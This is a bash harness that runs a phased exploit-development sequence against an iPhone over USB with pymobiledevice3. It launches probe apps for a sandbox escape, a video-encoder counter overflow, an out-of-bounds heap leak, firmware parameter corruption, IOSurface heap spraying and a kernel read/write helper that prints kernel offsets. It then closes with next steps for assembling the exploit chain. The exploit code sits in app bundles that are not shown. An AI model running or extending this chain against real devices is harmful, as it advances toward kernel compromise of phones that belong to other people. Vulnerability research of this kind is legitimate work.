#!/bin/bash
# iphone_duo_test_sequence.sh — Automated test sequence for iPhone Duo
#
# Run this when the iPhone Duo (A20 Pro, iOS 27.1) is first connected.
# It executes all probes in priority order and collects results.
#
# Usage: ./iphone_duo_test_sequence.sh [udid]

set -e

DEST="$HOME/a20_research"
RESULTS="$DEST/results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS"

UDID="${1:-$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d[0]['UniqueDeviceID']) if d else sys.exit(1)" 2>/dev/null)}"

if [ -z "$UDID" ]; then
    echo "ERROR: No USB device found. Connect iPhone Duo first."
    exit 1
fi

# Verify device identity
echo "============================================"
echo "  iPhone Duo Test Sequence"
echo "  Device: $UDID"
echo "  Results: $RESULTS"
echo "============================================"

DEVINFO=$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "
import json,sys
d = json.load(sys.stdin)
for x in d:
    if x.get('UniqueDeviceID') == '$UDID':
        print(f'Name={x.get(\"DeviceName\",\"?\")}, Model={x.get(\"ProductType\",\"?\")}, iOS={x.get(\"ProductVersion\",\"?\")}')
" 2>/dev/null)
echo "Device: $DEVINFO"
echo "$DEVINFO" > "$RESULTS/device_info.txt"

run_probe() {
    local name="$1"
    local bundle="$2"
    local args="$3"
    local desc="$4"
    local logfile="$RESULTS/${name}_${args// /_}.log"

    echo ""
    echo "--- [$name] $desc ---"
    echo "    Bundle: $bundle, Args: $args"

    # Launch and capture output
    timeout 120 pymobiledevice3 developer dvt launch "$UDID" "$bundle" $args > "$logfile" 2>&1 || true

    # Show summary
    if [ -f "$logfile" ]; then
        local lines=$(wc -l < "$logfile")
        echo "    Output: $lines lines (saved to $logfile)"
        # Show key findings
        grep -i "PASS\|FAIL\|ERROR\|CRASH\|PANIC\|SUCCESS\|DETECTED\|OVERFLOW\|CORRUPT" "$logfile" | head -5 | sed 's/^/    >>> /'
    else
        echo "    ERROR: No output"
    fi
}

echo ""
echo "============================================"
echo "  PHASE 0: worse_query Sandbox Escape Test"
echo "  (If this works, simplifies entire chain)"
echo "============================================"
run_probe "WQProbe" "com.research.wqprobe" "all" "Container sandbox escape (CVE-2026-65354)"

echo ""
echo "============================================"
echo "  PHASE 1: MV-HEVC Support Verification"
echo "  (MUST PASS — all AVE tests depend on this)"
echo "============================================"
run_probe "AVEFullChain" "com.research.avefullchain" "quick" "MV-HEVC encoder quick check"

# Check if MV-HEVC worked
if grep -q "MV-HEVC.*FAIL\|session.*failed\|-12912" "$RESULTS/AVEFullChain_quick.log" 2>/dev/null; then
    echo ""
    echo "!!! MV-HEVC FAILED — Cannot proceed with AVE tests !!!"
    echo "!!! This device may not support MV-HEVC hardware encoding !!!"
    echo ""
    echo "Continuing with non-AVE tests only..."
    # Skip to results
    echo "MV-HEVC: FAILED" > "$RESULTS/SUMMARY.txt"
else
    echo ""
    echo "============================================"
    echo "  PHASE 2: Safe Baselines"
    echo "============================================"
    run_probe "AVECounterOverflow" "com.research.avecounteroverflow" "safe" "50 encodes within bounds (baseline)"
    run_probe "AVEPPSValue" "com.research.aveppsvalue" "dump" "HEVC parameter set structure dump"

    echo ""
    echo "============================================"
    echo "  PHASE 3: Counter Overflow (GATING TESTS)"
    echo "============================================"
    run_probe "AVECounterOverflow" "com.research.avecounteroverflow" "boundary" "100 encodes — first OOB at ~86"
    run_probe "AVECounterOverflow" "com.research.avecounteroverflow" "deep" "250 encodes — firmware param array"

    echo ""
    echo "============================================"
    echo "  PHASE 4: OOB Read (Info Leak)"
    echo "============================================"
    run_probe "AVEOOBRead" "com.research.aveoobread" "multi" "CVE-2026-112465: heap data leak"
    run_probe "AVEOOBRead" "com.research.aveoobread" "overflow" "300+ encodes then readback"

    echo ""
    echo "============================================"
    echo "  PHASE 5: Firmware Parameter Corruption"
    echo "============================================"
    run_probe "AVEFirmwareParam" "com.research.avefwparam" "param_array" "220 enc lid=0x4141 → firmware params"
    run_probe "AVEFirmwareParam" "com.research.avefwparam" "w24_target" "250 enc lid=0xBEEF → W24 target"

    echo ""
    echo "============================================"
    echo "  PHASE 6: Cross-Buffer & Spray"
    echo "============================================"
    run_probe "AVECrossBuffer" "com.research.avecrossbuffer" "measure" "NAL size measurement for cumsum"
    run_probe "AVEIOSurfSpray" "com.research.aveiosurfspray" "readback" "IOSurface property get/set verify"
    run_probe "AVEIOSurfSpray" "com.research.aveiosurfspray" "spray_and_encode" "Full attack: spray + encode + detect"

    echo ""
    echo "============================================"
    echo "  PHASE 7: KRW Helper"
    echo "============================================"
    run_probe "KRWHelper" "com.research.krwhelper" "spray_only" "IOSurface spray and readback test"
    run_probe "KRWHelper" "com.research.krwhelper" "offsets" "Print estimated kernel offsets"
fi

echo ""
echo "============================================"
echo "  GENERATING SUMMARY"
echo "============================================"

{
    echo "iPhone Duo Test Sequence Results"
    echo "Date: $(date)"
    echo "Device: $DEVINFO"
    echo "UDID: $UDID"
    echo ""
    echo "=== Key Results ==="
    echo ""

    echo "--- worse_query (CVE-2026-65354) ---"
    if [ -f "$RESULTS/WQProbe_all.log" ]; then
        grep -i "SUCCESS\|FAIL\|sandbox escaped\|mkdir.*SUCCESS\|write.*SUCCESS" "$RESULTS/WQProbe_all.log" | head -10
    fi

    echo ""
    echo "--- MV-HEVC Support ---"
    if [ -f "$RESULTS/AVEFullChain_quick.log" ]; then
        grep -i "MV-HEVC\|session.*create\|encode.*status\|PASS\|FAIL" "$RESULTS/AVEFullChain_quick.log" | head -5
    fi

    echo ""
    echo "--- Counter Overflow ---"
    for f in "$RESULTS"/AVECounterOverflow_*.log; do
        [ -f "$f" ] || continue
        echo "$(basename $f):"
        grep -i "overflow\|OOB\|entry\|PASS\|FAIL\|panic\|crash" "$f" | head -5
    done

    echo ""
    echo "--- IOSurface Spray ---"
    for f in "$RESULTS"/AVEIOSurfSpray_*.log; do
        [ -f "$f" ] || continue
        echo "$(basename $f):"
        grep -i "corrupt\|detect\|spray\|mismatch\|SENTINEL\|PASS\|FAIL" "$f" | head -5
    done

    echo ""
    echo "--- KRW Helper ---"
    for f in "$RESULTS"/KRWHelper_*.log; do
        [ -f "$f" ] || continue
        echo "$(basename $f):"
        grep -i "spray\|readback\|surface\|offset\|OK\|FAIL" "$f" | head -5
    done

} > "$RESULTS/SUMMARY.txt"

cat "$RESULTS/SUMMARY.txt"

echo ""
echo "============================================"
echo "  All results saved to: $RESULTS"
echo "============================================"
echo ""
echo "NEXT STEPS based on results:"
echo "  If worse_query SUCCESS → Sandbox escape works, skip kernel mount flags"
echo "  If MV-HEVC PASS → Proceed with AVE exploit chain"
echo "  If counter overflow boundary PASS → OOB write confirmed on hardware"
echo "  If IOSurface spray detect → Heap corruption primitive works"
echo "  If KRW spray readback OK → R/W foundation ready"
